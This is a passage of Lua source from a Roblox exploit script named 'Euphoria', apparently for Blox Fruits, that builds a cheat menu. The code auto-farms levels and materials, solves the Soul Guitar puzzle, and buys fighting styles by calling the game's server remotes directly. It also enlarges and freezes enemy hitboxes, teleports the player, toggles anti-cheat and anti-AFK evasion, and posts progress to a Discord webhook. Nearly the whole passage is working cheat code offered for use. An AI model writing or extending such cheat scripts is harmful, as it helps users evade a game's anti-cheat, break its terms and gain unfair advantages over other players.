        if getgenv().EuphoriaSettings['Max Level'] then
            _G.MaxLevel = getgenv().EuphoriaSettings['Max Level']
            MaxLevelDropdown:UpdateSelect(tostring(getgenv().EuphoriaSettings['Max Level']))
        end

        if _G.MaxLevel and _G.MaxLevel > 0 then
            spawn(function()
                doneLeveling = false
                while wait() do
                    pcall(function()
                        if _G.MaxLevel == 700 or tostring(_G.MaxLevel) == '700' then
                            if second_sea then
                                doneLeveling = true
                            end
                        else
                            if LP.Data.Level.Value >= _G.MaxLevel then
                                doneLeveling = true
                            end
                        end
                    end)
                    if doneLeveling then
                        autoFarmLevel:UpdateToggle(nil, false)
                        _G.AntiAFK = false
                        _G.AntiCheat = false
                        _G.AutoRejoinServer = false
                        getgenv().EuphoriaSettings['Auto Rejoin'] = false
                        wait(.2)
                        st, err = pcall(function()
                            h=math.floor((math.floor(workspace.DistributedGameTime+0.5)/(60*60*1))%(24))
                            m=math.floor(math.floor(workspace.DistributedGameTime+0.5)/(60*1))%(60)
                            s=math.floor(math.floor(workspace.DistributedGameTime+0.5)/(1))%(60)
                            h=(string.len(h)==1 and "0"..h or h)
                            m=(string.len(m)==1 and "0"..m or m)
                            s=(string.len(s)==1 and "0"..s or s)
                            time = "Online Time: "..h..":"..m..":"..s

                            local Embed = {
                                ["title"] = LP.Name,
                                ["description"] = "**Reached **`" .. tostring(_G.MaxLevel) .. "` **level!\nScript will be automatically stopped\n**```\n" .. time .. "\n```",
                                ["type"] = "rich",
                                ["color"] = tonumber(0xffffff),
                                ["footer"] = {
                                    ["text"] = "e u p h o r i a =3",
                                }
                            };
                            sendWebhook(
                                webhook['level_webhook'],
                                "@here",
                                Embed 
                            )
                        end)
                        LP:Kick("Leveling Done!")
                        return 
                    end
                end
            end)
        end


        _G.SelectWeapon = _G.SelectWeapon or getgenv().EuphoriaSettings["Select Weapon"] or "Melee"
        WeaponDropdown = MainFarmSection:NewDropdown("Select Weapon", {"Melee", "Sword", "Fruit"}, function(currentOption)
            getgenv().EuphoriaSettings["Select Weapon"] = currentOption
            WriteSettings()
            _G.SelectWeapon = currentOption
        end)
        if getgenv().EuphoriaSettings["Select Weapon"] then
            WeaponDropdown:UpdateSelect(getgenv().EuphoriaSettings["Select Weapon"])
        end
        
        local FarmTab = Window:NewTab("Farm")
        local FarmSection = FarmTab:NewSection("Farming")
        FarmBones = false
        FarmEctoplasm = false
        if first_sea then
            FarmSection:NewToggle("Do Second Sea", function(state)
                _G.DoSecondSea = state
            end)
        end
        if second_sea then
            EctoplasmLabel = FarmSection:NewLabel("🍼 Ectoplasm: ")
            spawn(function()
                while wait() do
                    pcall(function()
                        EctoplasmLabel:UpdateLabel("🍼 Ectoplasm: " .. tostring(GetMaterial("Ectoplasm")))
                    end)
                end
            end)
            FarmEctoplasmToggle = FarmSection:NewToggle("Farm Ectoplasm", function(state)
                getgenv().EuphoriaSettings["Farm Ectoplasm"] = state
                WriteSettings()
                FarmEctoplasm = state
            end)
            if getgenv().EuphoriaSettings["Farm Ectoplasm"] then FarmEctoplasmToggle:UpdateToggle(nil, true) end
        end
        if third_sea then
            BonesLabel = FarmSection:NewLabel("💀 Bones: ")
            spawn(function()
                while wait() do
                    pcall(function()
                        BonesLabel:UpdateLabel("💀 Bones: " .. tostring(GetMaterial("Bones")))
                    end)
                end
            end)
            FarmBonesToggle = FarmSection:NewToggle("Farm Bones", function(state)
                getgenv().EuphoriaSettings["Farm Bones"] = state
                WriteSettings()
                FarmBones = state
            end)
            if getgenv().EuphoriaSettings["Farm Bones"] then FarmBonesToggle:UpdateToggle(nil, true) end
            FarmBonesToggleWithQuest = FarmSection:NewToggle("With Quest", function(state)
                getgenv().EuphoriaSettings["Farm Bones With Quest"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Bones With Quest"] then FarmBonesToggleWithQuest:UpdateToggle(nil, true) end
        end

        spawn(function()
            while task.wait() do
                if (FarmBones or FarmBonesCDK or FarmBonesGH) and third_sea then
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Bones With Quest"] and not LP.PlayerGui.Main.Quest.Visible then
                            if LP.Data.Level.Value >= 2050 then
                                game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", "HauntedQuest2", 2)
                            elseif LP.Data.Level.Value >= 2025 then
                                game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", "HauntedQuest2", 1)
                            elseif LP.Data.Level.Value >= 2000 then
                                game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", "HauntedQuest1", 2)
                            elseif LP.Data.Level.Value >= 1975 then
                                game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer("StartQuest", "HauntedQuest1", 1)
                            end
                        end                                                                                                     
                        if game:GetService("Workspace").Enemies:FindFirstChild("Reborn Skeleton") or game:GetService("Workspace").Enemies:FindFirstChild("Living Zombie") or game:GetService("Workspace").Enemies:FindFirstChild("Demonic Soul") or game:GetService("Workspace").Enemies:FindFirstChild("Posessed Mummy") then
                            target = getClosest({"Reborn Skeleton", "Living Zombie", "Demonic Soul", "Posessed Mummy"})
                            if target then
                                v = target
                                if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                    repeat task.wait()
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                        v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        v.Head.CanCollide = false
                                        BringMobFarm = true
                                        PosMon = v.HumanoidRootPart.CFrame
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.Transparency = 1
                                        toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                    until not FarmBones or not v.Parent or v.Humanoid.Health <= 0
                                end
                            end
                        else
                            pos = CFrame.new(-9515.04199, 210.81572, 5788.22217, -1, 4.91895875e-08, 0.000170758853, 4.91951333e-08, 1, 3.24608713e-08, -0.000170758853, 3.24692699e-08, -1)
                            useNearestEntrance(pos)
                            toPoint(pos)
                        end
                    end)
                end
            end
        end) 
        if first_sea or second_sea or third_sea then
            local MiscFarmItemsSection = FarmTab:NewSection("Misc farm")
            
            AutoSoulGuitar = MiscFarmItemsSection:NewToggle("Auto Soul Guitar [Need only Dark Fragment]", function(value)
                getgenv().EuphoriaSettings["Auto Soul Guitar"] = value
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Soul Guitar"] then AutoSoulGuitar:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Soul Guitar"] then _G.AutoSoulGuitar = true else _G.AutoSoulGuitar = false end
                    end)
                end
            end)

            SoulGuitarEctoplasm = false
            SoulGuitarBones = false
            SoulGuitarFrags = false
            spawn(function()
                while wait() do
                    st, err = pcall(function()
                        if _G.AutoSoulGuitar and not isWeaponInInventory("Soul Guitar") then
                            if GetMaterial("Ectoplasm") < 250 and not isWeaponInInventory("Soul Guitar") then
                                if SoulGuitarFrags then
                                    SoulGuitarFrags = false
                                    getgenv().EuphoriaSettings["killaura"] = false
                                    getgenv().EuphoriaSettings["autonextisland"] = false
                                    getgenv().EuphoriaSettings["autostartraid"] = false
                                    getgenv().EuphoriaSettings["autotradejunk"] = false
                                    getgenv().EuphoriaSettings["autobuychip"] = false
                                    getgenv().EuphoriaSettings["maxfrag"] = 0
                                    getgenv().EuphoriaSettings["enabledmaxfrag"] = false
                                end
                                if SoulGuitarBones then
                                    SoulGuitarBones = false
                                    FarmBones = false
                                end
                                if not second_sea then
                                    teleportToSecondSea()
                                else
                                    SoulGuitarEctoplasm = true 
                                    FarmEctoplasm = true
                                end
                            elseif GetMaterial("Bones") < 500 and not isWeaponInInventory("Soul Guitar") then
                                if SoulGuitarFrags then
                                    SoulGuitarFrags = false
                                    getgenv().EuphoriaSettings["killaura"] = false
                                    getgenv().EuphoriaSettings["autonextisland"] = false
                                    getgenv().EuphoriaSettings["autostartraid"] = false
                                    getgenv().EuphoriaSettings["autotradejunk"] = false
                                    getgenv().EuphoriaSettings["autobuychip"] = false
                                    getgenv().EuphoriaSettings["maxfrag"] = 0
                                    getgenv().EuphoriaSettings["enabledmaxfrag"] = false
                                end
                                if SoulGuitarEctoplasm then
                                    SoulGuitarEctoplasm = false
                                    FarmEctoplasm = false
                                end
                                if not third_sea then
                                    teleportToThirdSea()
                                else
                                    SoulGuitarBones = true
                                    FarmBones = true
                                end
                            elseif LP.Data.Fragments.Value < 5000 and not isWeaponInInventory("Soul Guitar") then
                                if SoulGuitarBones then
                                    SoulGuitarBones = false
                                    FarmBones = false
                                end
                                if SoulGuitarEctoplasm then
                                    SoulGuitarEctoplasm = false
                                    FarmEctoplasm = false
                                end
                                SoulGuitarFrags = true
                                getgenv().EuphoriaSettings["killaura"] = true
                                getgenv().EuphoriaSettings["autonextisland"] = true
                                getgenv().EuphoriaSettings["autostartraid"] = true
                                getgenv().EuphoriaSettings["autotradejunk"] = true
                                getgenv().EuphoriaSettings["autobuychip"] = true
                                getgenv().EuphoriaSettings["maxfrag"] = 5000
                                getgenv().EuphoriaSettings["enabledmaxfrag"] = true
                            else
                                if SoulGuitarFrags then
                                    SoulGuitarFrags = false
                                    getgenv().EuphoriaSettings["killaura"] = false
                                    getgenv().EuphoriaSettings["autonextisland"] = false
                                    getgenv().EuphoriaSettings["autostartraid"] = false
                                    getgenv().EuphoriaSettings["autotradejunk"] = false
                                    getgenv().EuphoriaSettings["autobuychip"] = false
                                    getgenv().EuphoriaSettings["maxfrag"] = 0
                                    getgenv().EuphoriaSettings["enabledmaxfrag"] = false
                                end
                                if SoulGuitarBones then
                                    SoulGuitarBones = false
                                    FarmBones = false
                                end
                                if SoulGuitarEctoplasm then
                                    SoulGuitarEctoplasm = false
                                    FarmEctoplasm = false
                                end
                                if not third_sea then
                                    teleportToThirdSea()
                                else
                                    if game:GetService("Workspace").Map["Haunted Castle"].Candle1.Transparency ~= 0 then
                                        if ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2) and type(ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2)) == "string" and string.find(ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2), "Error") then
                                            print("Go to Grave")
                                            toPoint(CFrame.new(-8653.03809, 141.131409, 6168.21777, -0.999985337, 3.62942778e-08, 0.00541123329, 3.5995388e-08, 1, -5.53324071e-08, -0.00541123329, -5.5136816e-08, -0.999985337))
                                        elseif ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2) and type(ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2)) == "string" and string.find(ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2), "Nothing") then
                                            print("Wait Next Night")
                                        else
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2)
                                            wait(.1)
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("gravestoneEvent",2,true)
                                            wait(.1)
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check")
                                        end
                                    else
                                        guitarStatuses = ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check")
                                        local swamp = guitarStatuses.Swamp
                                        local gravestones = guitarStatuses.Gravestones
                                        local ghost = guitarStatuses.Ghost
                                        local trophies = guitarStatuses.Trophies
                                        local pipes = guitarStatuses.Pipes
                                        if swamp and gravestones and ghost and trophies and pipes then
                                            if GetMaterial("Dark Fragment") > 0 and GetMaterial("Ectoplasm") >= 250 and GetMaterial("Bones") >= 500 then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("soulGuitarBuy")
                                            end
                                        else
                                            if not swamp then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Swamp")
                                                UnEquip()
                                                repeat wait()
                                                    CharPosition = CFrame.new(-10166.5586, 214.012268, 5938.11133, -0.445710421, -3.74314659e-08, -0.895177186, -9.14189684e-08, 1, 3.70308828e-09, 0.895177186, 8.34866754e-08, -0.445710421)
                                                    KillPosition = CFrame.new(-10166.5586, 180.012268, 5938.11133, -0.445710421, -3.74314659e-08, -0.895177186, -9.14189684e-08, 1, 3.70308828e-09, 0.895177186, 8.34866754e-08, -0.445710421)
                                                    toPoint(CharPosition)
                                                    for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                                                        if v.Name == 'Living Zombie' then
                                                            UnEquip()
                                                            toPoint(CharPosition)
                                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                            v.HumanoidRootPart.CanCollide = false
                                                            v.Humanoid.WalkSpeed = 0
                                                            v.Head.CanCollide = false
                                                            v.HumanoidRootPart.CFrame = KillPosition
                                                        end
                                                    end
                                                    count = 0
                                                    for i,v in pairs(game.Workspace.Enemies:GetChildren()) do
                                                        if v.Name == 'Living Zombie' then
                                                            if (v.HumanoidRootPart.CFrame.Position - KillPosition.Position).Magnitude < 15 then
                                                                count = count + 1
                                                                toPoint(CharPosition)
                                                            end
                                                        end
                                                    end
                                                    if count == 6 then
                                                        EquipWeapon(_G.SelectWeapon)
                                                        toPoint(CharPosition)
                                                        wait(5)
                                                    end
                                                until not _G.AutoSoulGuitar or game.Workspace.Map["Haunted Castle"].SwampWater.BrickColor ~= BrickColor.new("Maroon")
                                            elseif not gravestones then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Gravestones")
                                            elseif not ghost then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Ghost")
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Ghost", true)
                                                wait(.1)
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Check")
                                            elseif not trophies then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Trophies")
                                            elseif not pipes then
                                                ReplicatedStorage.Remotes.CommF_:InvokeServer("GuitarPuzzleProgress", "Pipes")
                                            end
                                        end
                                    end
                                end
                            end
                        else
                            if SoulGuitarFrags then
                                SoulGuitarFrags = false
                                getgenv().EuphoriaSettings["killaura"] = false
                                getgenv().EuphoriaSettings["autonextisland"] = false
                                getgenv().EuphoriaSettings["autostartraid"] = false
                                getgenv().EuphoriaSettings["autotradejunk"] = false
                                getgenv().EuphoriaSettings["autobuychip"] = false
                                getgenv().EuphoriaSettings["maxfrag"] = 0
                                getgenv().EuphoriaSettings["enabledmaxfrag"] = false
                            end
                            if SoulGuitarBones then
                                SoulGuitarBones = false
                                FarmBones = false
                            end
                            if SoulGuitarEctoplasm then
                                SoulGuitarEctoplasm = false
                                FarmEctoplasm = false
                            end
                        end
                    end)
                    if err then print(err) end
                end
            end)
            
            AutoGodhuman = MiscFarmItemsSection:NewToggle("Auto Godhuman [Farm frags before]", function(state)
                getgenv().EuphoriaSettings["Auto Godhuman"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Godhuman"] then AutoGodhuman:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Godhuman"] then _G.AutoGodhuman = true else _G.AutoGodhuman = false end
                    end)
                end
            end)

            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.AutoGodhuman then
                            if not _G.GodhumanInfo then
                                _G.GodhumanInfo = {}
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBlackLeg")
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Black Leg") or LP.Character:FindFirstChild("Black Leg") then
                                    if LP.Backpack:FindFirstChild("Black Leg") then
                                        _G.GodhumanInfo["Black Leg"] = LP.Backpack:FindFirstChild("Black Leg").Level.Value
                                    elseif LP.Character:FindFirstChild("Black Leg") then
                                        _G.GodhumanInfo["Black Leg"] = LP.Character:FindFirstChild("Black Leg").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Black Leg"] = false
                                end

                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectro")
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Electro") or LP.Character:FindFirstChild("Electro") then
                                    if LP.Backpack:FindFirstChild("Electro") then
                                        _G.GodhumanInfo["Electro"] = LP.Backpack:FindFirstChild("Electro").Level.Value
                                    elseif LP.Character:FindFirstChild("Electro") then
                                        _G.GodhumanInfo["Electro"] = LP.Character:FindFirstChild("Electro").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Electro"] = false
                                end

                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyFishmanKarate")
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Fishman Karate") or LP.Character:FindFirstChild("Fishman Karate") then
                                    if LP.Backpack:FindFirstChild("Fishman Karate") then
                                        _G.GodhumanInfo["Fishman Karate"] = LP.Backpack:FindFirstChild("Fishman Karate").Level.Value
                                    elseif LP.Character:FindFirstChild("Fishman Karate") then
                                        _G.GodhumanInfo["Fishman Karate"] = LP.Character:FindFirstChild("Fishman Karate").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Fishman Karate"] = false
                                end

                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","1")
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward","DragonClaw","2")
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Dragon Claw") or LP.Character:FindFirstChild("Dragon Claw") then
                                    if LP.Backpack:FindFirstChild("Dragon Claw") then
                                        _G.GodhumanInfo["Dragon Claw"] = LP.Backpack:FindFirstChild("Dragon Claw").Level.Value
                                    elseif LP.Character:FindFirstChild("Dragon Claw") then
                                        _G.GodhumanInfo["Dragon Claw"] = LP.Character:FindFirstChild("Dragon Claw").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Dragon Claw"] = false
                                end

                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySuperhuman") 
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Superhuman") or LP.Character:FindFirstChild("Superhuman") then
                                    if LP.Backpack:FindFirstChild("Superhuman") then
                                        _G.GodhumanInfo["Superhuman"] = LP.Backpack:FindFirstChild("Superhuman").Level.Value
                                    elseif LP.Character:FindFirstChild("Superhuman") then
                                        _G.GodhumanInfo["Superhuman"] = LP.Character:FindFirstChild("Superhuman").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Superhuman"] = false
                                end

                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep",true)
							    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep")
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Death Step") or LP.Character:FindFirstChild("Death Step") then
                                    if LP.Backpack:FindFirstChild("Death Step") then
                                        _G.GodhumanInfo["Death Step"] = LP.Backpack:FindFirstChild("Death Step").Level.Value
                                    elseif LP.Character:FindFirstChild("Death Step") then
                                        _G.GodhumanInfo["Death Step"] = LP.Character:FindFirstChild("Death Step").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Death Step"] = false
                                end
                                
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate",true)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate")  
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Sharkman Karate") or LP.Character:FindFirstChild("Sharkman Karate") then
                                    if LP.Backpack:FindFirstChild("Sharkman Karate") then
                                        _G.GodhumanInfo["Sharkman Karate"] = LP.Backpack:FindFirstChild("Sharkman Karate").Level.Value
                                    elseif LP.Character:FindFirstChild("Sharkman Karate") then
                                        _G.GodhumanInfo["Sharkman Karate"] = LP.Character:FindFirstChild("Sharkman Karate").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Sharkman Karate"] = false
                                end

                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectricClaw")
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Electric Claw") or LP.Character:FindFirstChild("Electric Claw") then
                                    if LP.Backpack:FindFirstChild("Electric Claw") then
                                        _G.GodhumanInfo["Electric Claw"] = LP.Backpack:FindFirstChild("Electric Claw").Level.Value
                                    elseif LP.Character:FindFirstChild("Electric Claw") then
                                        _G.GodhumanInfo["Electric Claw"] = LP.Character:FindFirstChild("Electric Claw").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Electric Claw"] = false
                                end

                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDragonTalon")
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Dragon Talon") or LP.Character:FindFirstChild("Dragon Talon") then
                                    if LP.Backpack:FindFirstChild("Dragon Talon") then
                                        _G.GodhumanInfo["Dragon Talon"] = LP.Backpack:FindFirstChild("Dragon Talon").Level.Value
                                    elseif LP.Character:FindFirstChild("Dragon Talon") then
                                        _G.GodhumanInfo["Dragon Talon"] = LP.Character:FindFirstChild("Dragon Talon").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Dragon Talon"] = false
                                end

                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyGodhuman")
                                wait(.08)
                                if LP.Backpack:FindFirstChild("Godhuman") or LP.Character:FindFirstChild("Godhuman") then
                                    if LP.Backpack:FindFirstChild("Godhuman") then
                                        _G.GodhumanInfo["Godhuman"] = LP.Backpack:FindFirstChild("Godhuman").Level.Value
                                    elseif LP.Character:FindFirstChild("Godhuman") then
                                        _G.GodhumanInfo["Godhuman"] = LP.Character:FindFirstChild("Godhuman").Level.Value
                                    end
                                else
                                    _G.GodhumanInfo["Godhuman"] = false
                                end
                            else
                                if LP.Backpack:FindFirstChild("Black Leg") or LP.Character:FindFirstChild("Black Leg") then
                                    if LP.Backpack:FindFirstChild("Black Leg") then
                                        _G.GodhumanInfo["Black Leg"] = LP.Backpack:FindFirstChild("Black Leg").Level.Value
                                    elseif LP.Character:FindFirstChild("Black Leg") then
                                        _G.GodhumanInfo["Black Leg"] = LP.Character:FindFirstChild("Black Leg").Level.Value
                                    end
                                end
                                if LP.Backpack:FindFirstChild("Electro") or LP.Character:FindFirstChild("Electro") then
                                    if LP.Backpack:FindFirstChild("Electro") then
                                        _G.GodhumanInfo["Electro"] = LP.Backpack:FindFirstChild("Electro").Level.Value
                                    elseif LP.Character:FindFirstChild("Electro") then
                                        _G.GodhumanInfo["Electro"] = LP.Character:FindFirstChild("Electro").Level.Value
                                    end
                                end
                                if LP.Backpack:FindFirstChild("Fishman Karate") or LP.Character:FindFirstChild("Fishman Karate") then
                                    if LP.Backpack:FindFirstChild("Fishman Karate") then
                                        _G.GodhumanInfo["Fishman Karate"] = LP.Backpack:FindFirstChild("Fishman Karate").Level.Value
                                    elseif LP.Character:FindFirstChild("Fishman Karate") then
                                        _G.GodhumanInfo["Fishman Karate"] = LP.Character:FindFirstChild("Fishman Karate").Level.Value
                                    end
                                end
                                if LP.Backpack:FindFirstChild("Dragon Claw") or LP.Character:FindFirstChild("Dragon Claw") then
                                    if LP.Backpack:FindFirstChild("Dragon Claw") then
                                        _G.GodhumanInfo["Dragon Claw"] = LP.Backpack:FindFirstChild("Dragon Claw").Level.Value
                                    elseif LP.Character:FindFirstChild("Dragon Claw") then
                                        _G.GodhumanInfo["Dragon Claw"] = LP.Character:FindFirstChild("Dragon Claw").Level.Value
                                    end
                                end
                                if LP.Backpack:FindFirstChild("Superhuman") or LP.Character:FindFirstChild("Superhuman") then
                                    if LP.Backpack:FindFirstChild("Superhuman") then
                                        _G.GodhumanInfo["Superhuman"] = LP.Backpack:FindFirstChild("Superhuman").Level.Value
                                    elseif LP.Character:FindFirstChild("Superhuman") then
                                        _G.GodhumanInfo["Superhuman"] = LP.Character:FindFirstChild("Superhuman").Level.Value
                                    end
                                end
                                if LP.Backpack:FindFirstChild("Death Step") or LP.Character:FindFirstChild("Death Step") then
                                    if LP.Backpack:FindFirstChild("Death Step") then
                                        _G.GodhumanInfo["Death Step"] = LP.Backpack:FindFirstChild("Death Step").Level.Value
                                    elseif LP.Character:FindFirstChild("Death Step") then
                                        _G.GodhumanInfo["Death Step"] = LP.Character:FindFirstChild("Death Step").Level.Value
                                    end
                                end
                                if LP.Backpack:FindFirstChild("Sharkman Karate") or LP.Character:FindFirstChild("Sharkman Karate") then
                                    if LP.Backpack:FindFirstChild("Sharkman Karate") then
                                        _G.GodhumanInfo["Sharkman Karate"] = LP.Backpack:FindFirstChild("Sharkman Karate").Level.Value
                                    elseif LP.Character:FindFirstChild("Sharkman Karate") then
                                        _G.GodhumanInfo["Sharkman Karate"] = LP.Character:FindFirstChild("Sharkman Karate").Level.Value
                                    end
                                end
                                if LP.Backpack:FindFirstChild("Electric Claw") or LP.Character:FindFirstChild("Electric Claw") then
                                    if LP.Backpack:FindFirstChild("Electric Claw") then
                                        _G.GodhumanInfo["Electric Claw"] = LP.Backpack:FindFirstChild("Electric Claw").Level.Value
                                    elseif LP.Character:FindFirstChild("Electric Claw") then
                                        _G.GodhumanInfo["Electric Claw"] = LP.Character:FindFirstChild("Electric Claw").Level.Value
                                    end
                                end
                                if LP.Backpack:FindFirstChild("Dragon Talon") or LP.Character:FindFirstChild("Dragon Talon") then
                                    if LP.Backpack:FindFirstChild("Dragon Talon") then
                                        _G.GodhumanInfo["Dragon Talon"] = LP.Backpack:FindFirstChild("Dragon Talon").Level.Value
                                    elseif LP.Character:FindFirstChild("Dragon Talon") then
                                        _G.GodhumanInfo["Dragon Talon"] = LP.Character:FindFirstChild("Dragon Talon").Level.Value
                                    end
                                end
                                if LP.Backpack:FindFirstChild("Godhuman") or LP.Character:FindFirstChild("Godhuman") then
                                    if LP.Backpack:FindFirstChild("Godhuman") then
                                        _G.GodhumanInfo["Godhuman"] = LP.Backpack:FindFirstChild("Godhuman").Level.Value
                                    elseif LP.Character:FindFirstChild("Godhuman") then
                                        _G.GodhumanInfo["Godhuman"] = LP.Character:FindFirstChild("Godhuman").Level.Value
                                    end
                                end
                                    
                                if (not _G.GodhumanWeaponSelected or _G.GodhumanWeaponSelected == "Black Leg") and _G.GodhumanInfo['Black Leg'] and _G.GodhumanInfo['Black Leg'] < 400 then
                                    if not LP.Backpack:FindFirstChild("Black Leg") and not LP.Character:FindFirstChild("Black Leg") then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBlackLeg")
                                    end
                                    if not third_sea then
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                    else
                                        _G.GodhumanWeaponSelected = "Black Leg"
                                        local plrLevel = LP.Data.Level.Value
                                        local mobList = {}
                                        if plrLevel >= 1500 and third_sea then
                                            mobList = {"Isle Outlaw", "Island Boy", "kissed", "Isle Champion"}
                                        end
                                        local farmMasTarget = getClosest(mobList)
                                        if farmMasTarget then
                                            if farmMasTarget:FindFirstChild("HumanoidRootPart") and farmMasTarget:FindFirstChild("Humanoid") and farmMasTarget:FindFirstChild("Humanoid").Health > 0 then
                                                repeat task.wait()
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                    farmMasTarget.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    farmMasTarget.HumanoidRootPart.CanCollide = false
                                                    farmMasTarget.Humanoid.WalkSpeed = 0
                                                    farmMasTarget.Head.CanCollide = false
                                                    BringMobFarm = true
                                                    PosMon = farmMasTarget.HumanoidRootPart.CFrame
                                                    EquipWeapon("Melee")
                                                    if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                        StopTween()
                                                    end
                                                    toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    _G.AimbotPos = farmMasTarget.HumanoidRootPart.CFrame
                                                    farmMasTarget.HumanoidRootPart.Transparency = 1
                                                until not _G.AutoGodhuman or not farmMasTarget.Parent or farmMasTarget.Humanoid.Health <= 0
                                            else
                                                if farmMasTarget.Parent.Name == "ReplicatedStorage" then
                                                    if useNearestEntrance(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame()) then
                                                        StopTween()
                                                    end
                                                    toTarget(farmMasTarget.HumanoidRootPart.CFrame * OffsetCFrame())
                                                end
                                            end
                                        else
                                            for _,FMSpawnPoint in pairs(getSpawnPoints(mobList)) do
                                                if getClosest(mobList) then break end
                                                if getDistance(FMSpawnPoint * OffsetCFrame()) > 100 then
                                                    repeat wait()
                                                        if useNearestEntrance(FMSpawnPoint * OffsetCFrame()) then
                                                            StopTween()
                                                        end
                                                        toPoint(FMSpawnPoint * OffsetCFrame())
                                                    until getDistance(FMSpawnPoint * OffsetCFrame()) < 50 or getClosest(mobList) or not _G.FarmWeaponMastery
                                                end
                                            end 
                                        end
                                    end
                                else
                                    if not _G.GodhumanInfo['Black Leg'] then
                                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBlackLeg")
                                        wait(.08)
                                        if LP.Backpack:FindFirstChild("Black Leg") or LP.Character:FindFirstChild("Black Leg") then
                                            if LP.Backpack:FindFirstChild("Black Leg") then
                                                _G.GodhumanInfo["Black Leg"] = LP.Backpack:FindFirstChild("Black Leg").Level.Value
                                            elseif LP.Character:FindFirstChild("Black Leg") then
                                                _G.GodhumanInfo["Black Leg"] = LP.Character:FindFirstChild("Black Leg").Level.Value
                                            end
                                        else
                                            _G.GodhumanInfo["Black Leg"] = false
                                        end
                                    else
